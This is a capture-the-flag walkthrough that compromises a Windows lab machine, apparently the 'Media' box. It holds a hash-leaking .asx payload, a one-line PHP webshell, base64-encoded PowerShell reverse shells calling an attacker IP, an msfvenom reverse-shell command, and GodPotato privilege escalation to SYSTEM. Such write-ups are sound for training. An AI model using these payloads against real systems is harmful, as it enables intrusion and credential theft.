
![logo](Images/logo.png)

# Attack Chain

```
└─► nmap → standalone Windows host → web app on 80 (PHP upload form)
	└─► malicious .asx upload → responder → NetNTLMv2 leak: MEDIA\enox
		└─► crack hash → enox:1234virus@
			└─► SSH as enox
				└─► index.php recon → world-writable upload dir + predictable md5 folder
					└─► NTFS junction → webshell in webroot → RCE: local service
						└─► FullPowers → full token → SeImpersonatePrivilege
							└─► GodPotato → NT AUTHORITY/SYSTEM
```

# Summary

- [Enumeration](#enumeration)
- [Website](#website)
	- [NetNTLMv2 capture](#netntlmv2-capture)
	- [Crack enox hash](#crack-enox-hash)
	- [Shell as enox](#shell-as-enox)
- [Lateral Movememt](#lateral-movememt)
	- [Index.php inspection](#indexphp-inspection)
	- [Upload directory](#upload-directory)
	- [Junction between upload directory and webroot directory](#junction-between-upload-directory-and-webroot-directory)
	- [Shell as local service](#shell-as-local-service)
- [Privilege Escalation](#privilege-escalation)
	- [SeTcbPrivilege](#setcbprivilege)
	- [Revshell attempt failed](#revshell-attempt-failed)
	- [FullPower](#fullpower)
	- [SeImpersonatePrivilege](#seimpersonateprivilege)

---
# Enumeration

Let's first scan the target for open ports.

```bash
nmap -sCV 10.129.234.67 

PORT     STATE SERVICE       VERSION
22/tcp   open  ssh           OpenSSH for_Windows_9.5 (protocol 2.0)
80/tcp   open  http          Apache httpd 2.4.56 ((Win64) OpenSSL/1.1.1t PHP/8.1.17)
|_http-server-header: Apache/2.4.56 (Win64) OpenSSL/1.1.1t PHP/8.1.17
|_http-title: ProMotion Studio
3389/tcp open  ms-wbt-server Microsoft Terminal Services
|_ssl-date: 2026-06-10T14:17:15+00:00; 0s from scanner time.
| ssl-cert: Subject: commonName=MEDIA
| Not valid before: 2026-06-09T14:08:47
|_Not valid after:  2026-12-09T14:08:47
| rdp-ntlm-info: 
|   Target_Name: MEDIA
|   NetBIOS_Domain_Name: MEDIA
|   NetBIOS_Computer_Name: MEDIA
|   DNS_Domain_Name: MEDIA
|   DNS_Computer_Name: MEDIA
|   Product_Version: 10.0.20348
|_  System_Time: 2026-06-10T14:17:10+00:00
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows
```

> [!NOTE]
> **Observations**
> - It's a standalone machine
> - The entry point is probably the apache server running on port 80

# Website

![website](Images/website.png)

We are landing on the company website. It runs PHP since going to `/index.php` redirect us to the default page.

At the bottom of the page we notice the following :

![file upload](Images/file%20upload.png)

We have the possibility to upload file compatible with **Windows Media Player**, which will likely be be reviewed by an employee.

### NetNTLMv2 capture

The vulnerability exploited here is documented in this [Morphisec article](https://www.morphisec.com/blog/5-ntlm-vulnerabilities-unpatched-privilege-escalation-threats-in-microsoft/). By crafting a malicious `.asx` playlist, we force the player to connect to an SMB share we control, leaking the victim's NetNTLMv2 hash.

We have an exemple payload on [hacktricks](https://hacktricks.wiki/en/windows-hardening/ntlm/places-to-steal-ntlm-creds.html#windows-media-player-playlists-asxwax), let's adapt it for our machine.

**shell.asx**
```xml
<asx version="3.0">
  <title>Leak</title>
  <entry>
    <title></title>
    <ref href="file://10.10.*.*\\share\\track.mp3" />
  </entry>
</asx>
```

When opened by an user, the file will try to fetch a file that doesn't exist on our fake SMB share which will leak its NetNTLMv2 hash allowing us to attempt to crack it and retrieve its password.

Let's start responder to simulate an SMB share before uploading our file.

```bash
responder -I tun0

[+] Listening for events...
```

Now let's upload our file on the website with random informations.

![upload malicious asx](Images/upload%20malicious%20asx.png)

And we click on **UPLOAD FILE**

![upload confirmation](Images/upload%20confirmation.png)

The website tell us that the video will be reviewed shortly. Let's wait a bit and look at `Responder`.

```bash
responder -I tun0

<SNIP>

[SMB] NTLMv2-SSP Client   : 10.129.234.67
[SMB] NTLMv2-SSP Username : MEDIA\enox
[SMB] NTLMv2-SSP Hash     : enox::MEDIA:e0d5910273733dd3:02511F16D4B5441FCFBCEEF0F3D5E2C7:010100000000000080BB3CB1C7F8DC010407CC72161E980E00000000020008004B0047004B00450001001E00570049004E002D003000590057003800420041004200340031005300490004003400570049004E002D00300059005700380042004100420034003100530049002E004B0047004B0045002E004C004F00430041004C00030014004B0047004B0045002E004C004F00430041004C00050014004B0047004B0045002E004C004F00430041004C000700080080BB3CB1C7F8DC0106000400020000000800300030000000000000000000000000300000D64489362D603C7EFCAC61EFE3F7FA5BACF0187A50DBDE1F685DDFEE0A7B2A570A001000000000000000000000000000000000000900220063006900660073002F00310030002E00310030002E00310035002E003100360030000000000000000000

<SNIP>
```

We captured the NetNTLMv2 hash of the user `enox`.

### Crack enox hash

Let's try to crack it with hashcat.

```bash
echo '<enox's_hash>' > hash.txt
```

```bash
hashcat hash.txt /usr/share/wordlists/rockyou.txt

<SNIP>

ENOX::MEDIA:<hash>:1234virus@
```

> [!TIP]
> **Credentials found**
> - Username = `enox`
> - Password =`1234virus@`

### Shell as enox

Since SSH is open on the target, let's connect with the credentials we obtained.

```bash
ssh enox@10.129.234.67
enox@10.129.234.67's password: 


enox@MEDIA C:\Users\enox>
```

# Lateral Movememt

Now that have a shell on the target, let's inspect the website's files further.
### Index.php inspection

Let's have a look at `index.php`located inside the webroot under `C:\xampp\htdocs`.

```shell
enox@MEDIA C:\Windows\Tasks\Uploads>type C:\xampp\htdocs\index.php
```

```php
<?php
error_reporting(0);

    // Your PHP code for handling form submission and file upload goes here.
    $uploadDir = 'C:/Windows/Tasks/Uploads/'; // Base upload directory

    if ($_SERVER["REQUEST_METHOD"] == "POST" && isset($_FILES["fileToUpload"])) {
        $firstname = filter_var($_POST["firstname"], FILTER_SANITIZE_STRING);
        $lastname = filter_var($_POST["lastname"], FILTER_SANITIZE_STRING);
        $email = filter_var($_POST["email"], FILTER_SANITIZE_STRING);

        // Create a folder name using the MD5 hash of Firstname + Lastname + Email
        $folderName = md5($firstname . $lastname . $email);

        // Create the full upload directory path
        $targetDir = $uploadDir . $folderName . '/';

        // Ensure the directory exists; create it if not
        if (!file_exists($targetDir)) {
            mkdir($targetDir, 0777, true);
        }

        // Sanitize the filename to remove unsafe characters
        $originalFilename = $_FILES["fileToUpload"]["name"];
        $sanitizedFilename = preg_replace("/[^a-zA-Z0-9._]/", "", $originalFilename);


        // Build the full path to the target file
        $targetFile = $targetDir . $sanitizedFilename;

        if (move_uploaded_file($_FILES["fileToUpload"]["tmp_name"], $targetFile)) {
            echo "<script>alert('Your application was successfully submitted. Our HR shall review your video and get back to you.');</script>";

            // Update the todo.txt file
            $todoFile = $uploadDir . 'todo.txt';
            $todoContent = "Filename: " . $originalFilename . ", Random Variable: " . $folderName . "\n";

            // Append the new line to the file
            file_put_contents($todoFile, $todoContent, FILE_APPEND);
        } else {
            echo "<script>alert('Uh oh, something went wrong... Please submit again');</script>";
        }
    }
    ?>

<SNIP>
```

> [!NOTE]
> **Key points**
> - Upload directory is `C:\Windows\Tasks\Uploads`
> - The destination subfolder = **`md5(firstname + lastname + email)`** is **predictable**. We can recompute it on the attacker side.
> - `preg_replace` only sanitizes the filename, not the folder path.

### Upload directory

We can check with `icacls` our permissions on the folder.

```shell
PS C:\Windows\Tasks\Uploads> icacls C:\Windows\Tasks\Uploads
C:\Windows\Tasks\Uploads Everyone:(OI)(CI)(F)
                         BUILTIN\Administrators:(I)(F)
                         BUILTIN\Administrators:(I)(OI)(CI)(IO)(F)
                         NT AUTHORITY\SYSTEM:(I)(F)
                         NT AUTHORITY\SYSTEM:(I)(OI)(CI)(IO)(F)
                         CREATOR OWNER:(I)(OI)(CI)(IO)(F)

Successfully processed 1 files; Failed processing 0 files
```

> [!WARNING]
> **Misconfiguration**
> `Everyone:(OI)(CI)(F)` means **Full control** for everyone on the upload directory.

Let's investigate the folder now.

```shell
enox@MEDIA C:\Windows\Tasks\Uploads>dir
 Volume in drive C has no label.
 Volume Serial Number is EAD8-5D48

 Directory of C:\Windows\Tasks\Uploads

06/10/2026  07:57 AM    <DIR>          .
10/02/2023  11:04 AM    <DIR>          ..
06/10/2026  07:56 AM    <DIR>          566537929bb692f41c445544ead8f0e8
06/10/2026  07:18 AM    <DIR>          d41d8cd98f00b204e9800998ecf8427e
06/10/2026  07:57 AM                 0 todo.txt
               1 File(s)              0 bytes
               4 Dir(s)   9,968,459,776 bytes free
```

Our payload is inside `566537929bb692f41c445544ead8f0e8`, the MD5 hash of the informations we provided during the upload.

### Junction between upload directory and webroot directory

Since we have full rights on the upload folder, we can create a junction to the webroot, so everything we will upload on the website will land in the webroot, allowing us to gain an RCE as the user running the service.

First we need to upload a file with different informations, so the script create a new directory with nothing used inside.

```shell
PS C:\Windows\Tasks\Uploads\9950307b2ad4f1b703d3a12e7bf82184> ls


    Directory: C:\Windows\Tasks\Uploads\9950307b2ad4f1b703d3a12e7bf82184


Mode                 LastWriteTime         Length Name
----                 -------------         ------ ----
-a----         6/10/2026   8:46 AM             35 shell.php
```

Our file `shell.php` contains a simple php webshell.

```php
<?php system($_REQUEST['cmd']); ?>
```

Once we have the hash, we remove everything inside including the folder to make the junction. We can't do it if the folder already exist.

```shell
PS C:\Windows\Tasks\Uploads> rm .\9950307b2ad4f1b703d3a12e7bf82184\shell.php
PS C:\Windows\Tasks\Uploads> rm .\9950307b2ad4f1b703d3a12e7bf82184\
```

And we create the junction.

```shell
enox@MEDIA C:\Windows\Tasks\Uploads>mklink /J C:\Windows\Tasks\Uploads\9950307b2ad4f1b703d3a12e7bf82184 C:\xampp\htdocs 

Junction created for C:\Windows\Tasks\Uploads\9950307b2ad4f1b703d3a12e7bf82184 <<===>> C:\xampp\htdocs
```

Now, when we reupload a file with the same information, it should recreate the directory we removed, but since the junction exist, the file will land in the webroot directory so we will be able to call it from outside with a `curl`request.

```shell
enox@MEDIA C:\Windows\Tasks\Uploads>dir C:\xampp\htdocs
 Volume in drive C has no label.
 Volume Serial Number is EAD8-5D48

 Directory of C:\xampp\htdocs

06/10/2026  08:52 AM    <DIR>          .
10/02/2023  11:03 AM    <DIR>          ..
10/02/2023  10:27 AM    <DIR>          assets
10/02/2023  10:27 AM    <DIR>          css
10/10/2023  05:00 AM            20,563 index.php
10/02/2023  10:27 AM    <DIR>          js
06/10/2026  08:52 AM                35 shell.php
```

It worked as expected. We should be able to call it with `curl` from our machine.


```bash
curl 'http://10.129.234.67/shell.php?cmd=whoami'

nt authority\local service
```

### Shell as local service

We can craft an encoded powershell  reverse shell payload with https://www.revshells.com/ and send it over our webshell.

```shell
curl 'http://10.129.234.67/shell.php?cmd=powershell+-e+JABjAGwAaQBlAG4AdAAgAD0AIABOAGUAdwAtAE8AYgBqAGUAYwB0ACAAUwB5AHMAdABlAG0ALgBOAGUAdAAuAFMAbwBjAGsAZQB0AHMALgBUAEMAUABDAGwAaQBlAG4AdAAoACIAMQAwAC4AMQAwAC4AMQA1AC4AMQA2ADAAIgAsADkAMAAwADEAKQA7ACQAcwB0AHIAZQBhAG0AIAA9ACAAJABjAGwAaQBlAG4AdAAuAEcAZQB0AFMAdAByAGUAYQBtACgAKQA7AFsAYgB5AHQAZQBbAF0AXQAkAGIAeQB0AGUAcwAgAD0AIAAwAC4ALgA2ADUANQAzADUAfAAlAHsAMAB9ADsAdwBoAGkAbABlACgAKAAkAGkAIAA9ACAAJABzAHQAcgBlAGEAbQAuAFIAZQBhAGQAKAAkAGIAeQB0AGUAcwAsACAAMAAsACAAJABiAHkAdABlAHMALgBMAGUAbgBnAHQAaAApACkAIAAtAG4AZQAgADAAKQB7ADsAJABkAGEAdABhACAAPQAgACgATgBlAHcALQBPAGIAagBlAGMAdAAgAC0AVAB5AHAAZQBOAGEAbQBlACAAUwB5AHMAdABlAG0ALgBUAGUAeAB0AC4AQQBTAEMASQBJAEUAbgBjAG8AZABpAG4AZwApAC4ARwBlAHQAUwB0AHIAaQBuAGcAKAAkAGIAeQB0AGUAcwAsADAALAAgACQAaQApADsAJABzAGUAbgBkAGIAYQBjAGsAIAA9ACAAKABpAGUAeAAgACQAZABhAHQAYQAgADIAPgAmADEAIAB8ACAATwB1AHQALQBTAHQAcgBpAG4AZwAgACkAOwAkAHMAZQBuAGQAYgBhAGMAawAyACAAPQAgACQAcwBlAG4AZABiAGEAYwBrACAAKwAgACIAUABTACAAIgAgACsAIAAoAHAAdwBkACkALgBQAGEAdABoACAAKwAgACIAPgAgACIAOwAkAHMAZQBuAGQAYgB5AHQAZQAgAD0AIAAoAFsAdABlAHgAdAAuAGUAbgBjAG8AZABpAG4AZwBdADoAOgBBAFMAQwBJAEkAKQAuAEcAZQB0AEIAeQB0AGUAcwAoACQAcwBlAG4AZABiAGEAYwBrADIAKQA7ACQAcwB0AHIAZQBhAG0ALgBXAHIAaQB0AGUAKAAkAHMAZQBuAGQAYgB5AHQAZQAsADAALAAkAHMAZQBuAGQAYgB5AHQAZQAuAEwAZQBuAGcAdABoACkAOwAkAHMAdAByAGUAYQBtAC4ARgBsAHUAcwBoACgAKQB9ADsAJABjAGwAaQBlAG4AdAAuAEMAbABvAHMAZQAoACkA'
```

We should get a reverse shell on our listener.

```bash
penelope -i tun0 -p 9001
[+] Listening for reverse shells on 10.10.15.160:9001 
➤  🏠 Main Menu (m) 💀 Payloads (p) 🔄 Clear (Ctrl-L) 🚫 Quit (q/Ctrl-C)
[+] [New Reverse Shell] => MEDIA 10.129.234.67 Microsoft_Windows_Server_2022_Standard-x64-based_PC 👤 nt authority\local service 😍️ Session ID <1>
[+] Added readline support...
[+] Interacting with session [1] • Readline • Menu key Ctrl-D ⇐
[+] Session log: /home/makiss/.penelope/sessions/MEDIA~10.129.234.67-Microsoft_Windows_Server_2022_Standard-x64-based_PC/2026_06_11-03_31_14-560-nt authority\local service.log
────────────────────────────────────────────────────────────────────────────────
PS C:\xampp\htdocs> whoami
nt authority\local service
```

We have a shell as `local service`.
# Privilege Escalation

Since it's a built-in service user, let's check its privileges on the system.

```shell
PS C:\Users\Public\Documents> whoami /priv

PRIVILEGES INFORMATION
----------------------

Privilege Name                Description                         State   
============================= =================================== ========
SeTcbPrivilege                Act as part of the operating system Disabled
SeChangeNotifyPrivilege       Bypass traverse checking            Enabled 
SeCreateGlobalPrivilege       Create global objects               Enabled 
SeIncreaseWorkingSetPrivilege Increase a process working set      Disabled
SeTimeZonePrivilege           Change the time zone                Disabled
```

### SeTcbPrivilege

The user has `SeTcbPrivilege` which can be abused to run commands as SYSTEM. 
There is a POC [here](https://github.com/b4lisong/SeTcbPrivilege-Abuse) that we can try.

However the privilege is stated as **Disabled**. We can try to enable it by using that [script](https://github.com/fashionproof/EnableAllTokenPrivs/blob/master/EnableAllTokenPrivs.ps1).

We start a python http server on our machine and transfer every files needed, on the target.

```shell
python3 -m http.server
```

```shell
PS C:\Users\Public\Documents> wget http://10.10.15.160:8000/TcbElevation-x64.exe -o TcbElevation-x64.exe
PS C:\Users\Public\Documents> wget http://10.10.15.160:8000/EnableAllTokenPrivs.ps1 -o EnableAllTokenPrivs.ps1
```

Let's try to enable the privilege.

```shell
PS C:\Users\Public\Documents> .\EnableAllTokenPrivs.ps1
PS C:\Users\Public\Documents> whoami /priv

PRIVILEGES INFORMATION
----------------------

Privilege Name                Description                         State   
============================= =================================== ========
SeTcbPrivilege                Act as part of the operating system Disabled
SeChangeNotifyPrivilege       Bypass traverse checking            Enabled 
SeCreateGlobalPrivilege       Create global objects               Enabled 
SeIncreaseWorkingSetPrivilege Increase a process working set      Disabled
SeTimeZonePrivilege           Change the time zone                Disabled
```

It didn't work.

### Revshell attempt failed

Even though the privilege is stated as disabled, let's try the exploit anyways.

We create a reverse shell using `msfvenom` and send it over the target.

```shell
msfvenom -p windows/x64/shell_reverse_tcp LHOST=tun0 LPORT=9001 -o rev.exe
```

```shell
PS C:\Users\Public\Documents> wget http://10.10.15.160:8000/rev.exe -o rev.exe
```

```
PS C:\Users\Public\Documents> ./TcbElevation-x64.exe elevate "C:\Users\Public\Documents\rev.exe"

Error creating service 1073
```

We didn't receive a revershell and an error appears after our command.

Let's try to add `enox` to the administrators group instead.

```
PS C:\Users\Public\Documents> .\TcbElevation-x64.exe elevate 'net localgroup Administrators enox /add'
```

```shell
net localgroup administrators

Alias name     administrators
Comment        Administrators have complete and unrestricted access to the computer/domain

Members

-------------------------------------------------------------------------------
Administrator
The command completed successfully.
```

It didn't work either so we have to find another way.

### FullPower

There is an executable called **FullPower** that can be used to retrieved a session with every privilege an user should have. Since we have a service account, there is probably more privileges that we could see so let's dig into that path.

We can find the executable [here](https://github.com/itm4n/FullPowers).

Let's transfer it to the target

```
wget http://10.10.15.160:8000/FullPowers.exe -o FullPowers.exe
```

Now, we send us a reverse shell again.

```shell
PS C:\Users\Public\Documents> .\FullPowers -c 'powershell -e JABjAGwAaQBlAG4AdAAgAD0AIABOAGUAdwAtAE8AYgBqAGUAYwB0ACAAUwB5AHMAdABlAG0ALgBOAGUAdAAuAFMAbwBjAGsAZQB0AHMALgBUAEMAUABDAGwAaQBlAG4AdAAoACIAMQAwAC4AMQAwAC4AMQA1AC4AMQA2ADAAIgAsADkAMAAwADEAKQA7ACQAcwB0AHIAZQBhAG0AIAA9ACAAJABjAGwAaQBlAG4AdAAuAEcAZQB0AFMAdAByAGUAYQBtACgAKQA7AFsAYgB5AHQAZQBbAF0AXQAkAGIAeQB0AGUAcwAgAD0AIAAwAC4ALgA2ADUANQAzADUAfAAlAHsAMAB9ADsAdwBoAGkAbABlACgAKAAkAGkAIAA9ACAAJABzAHQAcgBlAGEAbQAuAFIAZQBhAGQAKAAkAGIAeQB0AGUAcwAsACAAMAAsACAAJABiAHkAdABlAHMALgBMAGUAbgBnAHQAaAApACkAIAAtAG4AZQAgADAAKQB7ADsAJABkAGEAdABhACAAPQAgACgATgBlAHcALQBPAGIAagBlAGMAdAAgAC0AVAB5AHAAZQBOAGEAbQBlACAAUwB5AHMAdABlAG0ALgBUAGUAeAB0AC4AQQBTAEMASQBJAEUAbgBjAG8AZABpAG4AZwApAC4ARwBlAHQAUwB0AHIAaQBuAGcAKAAkAGIAeQB0AGUAcwAsADAALAAgACQAaQApADsAJABzAGUAbgBkAGIAYQBjAGsAIAA9ACAAKABpAGUAeAAgACQAZABhAHQAYQAgADIAPgAmADEAIAB8ACAATwB1AHQALQBTAHQAcgBpAG4AZwAgACkAOwAkAHMAZQBuAGQAYgBhAGMAawAyACAAPQAgACQAcwBlAG4AZABiAGEAYwBrACAAKwAgACIAUABTACAAIgAgACsAIAAoAHAAdwBkACkALgBQAGEAdABoACAAKwAgACIAPgAgACIAOwAkAHMAZQBuAGQAYgB5AHQAZQAgAD0AIAAoAFsAdABlAHgAdAAuAGUAbgBjAG8AZABpAG4AZwBdADoAOgBBAFMAQwBJAEkAKQAuAEcAZQB0AEIAeQB0AGUAcwAoACQAcwBlAG4AZABiAGEAYwBrADIAKQA7ACQAcwB0AHIAZQBhAG0ALgBXAHIAaQB0AGUAKAAkAHMAZQBuAGQAYgB5AHQAZQAsADAALAAkAHMAZQBuAGQAYgB5AHQAZQAuAEwAZQBuAGcAdABoACkAOwAkAHMAdAByAGUAYQBtAC4ARgBsAHUAcwBoACgAKQB9ADsAJABjAGwAaQBlAG4AdAAuAEMAbABvAHMAZQAoACkA'

[+] [New Reverse Shell] => MEDIA 10.129.234.67 Microsoft_Windows_Server_2022_Standard-x64-based_PC 👤 nt authority\local service 😍️ Session ID <2>
```

```bash
(Penelope)─(Session [1])> sessions 2

PS C:\Windows\system32> whoami /priv

PRIVILEGES INFORMATION
----------------------

Privilege Name                Description                               State  
============================= ========================================= =======
SeAssignPrimaryTokenPrivilege Replace a process level token             Enabled
SeIncreaseQuotaPrivilege      Adjust memory quotas for a process        Enabled
SeAuditPrivilege              Generate security audits                  Enabled
SeChangeNotifyPrivilege       Bypass traverse checking                  Enabled
SeImpersonatePrivilege        Impersonate a client after authentication Enabled
SeCreateGlobalPrivilege       Create global objects                     Enabled
SeIncreaseWorkingSetPrivilege Increase a process working set            Enabled
```

We indeed have more privileges.

### SeImpersonatePrivilege

`SeImpersonatePrivilege` is a known privilege and often abused to perform **Local Privilege Escalation**. There is a lot of different techniques to exploit it but we will use [GodPotato](https://github.com/BeichenDream/GodPotato) here.

> [!NOTE]
> **How GodPotato abuses SeImpersonatePrivilege**
> It forces RPCSS/DCOM to authenticate to a named pipe it controls, captures the SYSTEM token via the pipe, then **impersonates** it (allowed by `SeImpersonatePrivilege`) to spawn a process as SYSTEM.

First we transfer the file to the target.

```
wget http://10.10.15.160:8000/GodPotato-NET4.exe -o GodPotato-NET4.exe
```

Let's try to run a simple command to see what it returns.

```
PS C:\Users\Public\Documents> .\GodPotato-NET4.exe -cmd "whoami"
[*] CombaseModule: 0x140712868380672
[*] DispatchTable: 0x140712870967624
[*] UseProtseqFunction: 0x140712870260928
[*] UseProtseqFunctionParamCount: 6
[*] HookRPC
[*] Start PipeServer
[*] CreateNamedPipe \\.\pipe\7a5a4d5e-3707-453c-b821-2559c16e1c51\pipe\epmapper
[*] Trigger RPCSS
[*] DCOM obj GUID: 00000000-0000-0000-c000-000000000046
[*] DCOM obj IPID: 00009402-0478-ffff-1df7-557a6182e5db
[*] DCOM obj OXID: 0x9021f5c0a30b73b
[*] DCOM obj OID: 0xda2b2ba732385e61
[*] DCOM obj Flags: 0x281
[*] DCOM obj PublicRefs: 0x0
[*] Marshal Object bytes len: 100
[*] UnMarshal Object
[*] Pipe Connected!
[*] CurrentUser: NT AUTHORITY\NETWORK SERVICE
[*] CurrentsImpersonationLevel: Impersonation
[*] Start Search System Token
[*] PID : 900 Token:0x788  User: NT AUTHORITY\SYSTEM ImpersonationLevel: Impersonation
[*] Find System Token : True
[*] UnmarshalObject: 0x80070776
[*] CurrentUser: NT AUTHORITY\SYSTEM
[*] process start with pid 608
nt authority\system
```

We have command execution as **SYSTEM**. Let's send us a reverse shell once again.

```
PS C:\Users\Public\Documents> .\GodPotato-NET4.exe -cmd "powershell -e JABjAGwAaQBlAG4AdAAgAD0AIABOAGUAdwAtAE8AYgBqAGUAYwB0ACAAUwB5AHMAdABlAG0ALgBOAGUAdAAuAFMAbwBjAGsAZQB0AHMALgBUAEMAUABDAGwAaQBlAG4AdAAoACIAMQAwAC4AMQAwAC4AMQA1AC4AMQA2ADAAIgAsADkAMAAwADEAKQA7ACQAcwB0AHIAZQBhAG0AIAA9ACAAJABjAGwAaQBlAG4AdAAuAEcAZQB0AFMAdAByAGUAYQBtACgAKQA7AFsAYgB5AHQAZQBbAF0AXQAkAGIAeQB0AGUAcwAgAD0AIAAwAC4ALgA2ADUANQAzADUAfAAlAHsAMAB9ADsAdwBoAGkAbABlACgAKAAkAGkAIAA9ACAAJABzAHQAcgBlAGEAbQAuAFIAZQBhAGQAKAAkAGIAeQB0AGUAcwAsACAAMAAsACAAJABiAHkAdABlAHMALgBMAGUAbgBnAHQAaAApACkAIAAtAG4AZQAgADAAKQB7ADsAJABkAGEAdABhACAAPQAgACgATgBlAHcALQBPAGIAagBlAGMAdAAgAC0AVAB5AHAAZQBOAGEAbQBlACAAUwB5AHMAdABlAG0ALgBUAGUAeAB0AC4AQQBTAEMASQBJAEUAbgBjAG8AZABpAG4AZwApAC4ARwBlAHQAUwB0AHIAaQBuAGcAKAAkAGIAeQB0AGUAcwAsADAALAAgACQAaQApADsAJABzAGUAbgBkAGIAYQBjAGsAIAA9ACAAKABpAGUAeAAgACQAZABhAHQAYQAgADIAPgAmADEAIAB8ACAATwB1AHQALQBTAHQAcgBpAG4AZwAgACkAOwAkAHMAZQBuAGQAYgBhAGMAawAyACAAPQAgACQAcwBlAG4AZABiAGEAYwBrACAAKwAgACIAUABTACAAIgAgACsAIAAoAHAAdwBkACkALgBQAGEAdABoACAAKwAgACIAPgAgACIAOwAkAHMAZQBuAGQAYgB5AHQAZQAgAD0AIAAoAFsAdABlAHgAdAAuAGUAbgBjAG8AZABpAG4AZwBdADoAOgBBAFMAQwBJAEkAKQAuAEcAZQB0AEIAeQB0AGUAcwAoACQAcwBlAG4AZABiAGEAYwBrADIAKQA7ACQAcwB0AHIAZQBhAG0ALgBXAHIAaQB0AGUAKAAkAHMAZQBuAGQAYgB5AHQAZQAsADAALAAkAHMAZQBuAGQAYgB5AHQAZQAuAEwAZQBuAGcAdABoACkAOwAkAHMAdAByAGUAYQBtAC4ARgBsAHUAcwBoACgAKQB9ADsAJABjAGwAaQBlAG4AdAAuAEMAbABvAHMAZQAoACkA"

[+] [New Reverse Shell] => MEDIA 10.129.234.67 Microsoft_Windows_Server_2022_Standard-x64-based_PC 👤 nt authority\system 😍️ Session ID <3>

(Penelope)─(Session [2])> sessions 3
[+] Added readline support...
[+] Interacting with session [3] • Readline • Menu key Ctrl-D ⇐
[+] Session log: /home/makiss/.penelope/sessions/MEDIA~10.129.234.67-Microsoft_Windows_Server_2022_Standard-x64-based_PC/2026_06_11-04_24_10-983-nt authority\system.log
──────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
PS C:\Users\Public\Documents> whoami
nt authority\system
```

> [!TIP]
> **Machine rooted**
> **SYSTEM** access obtained.

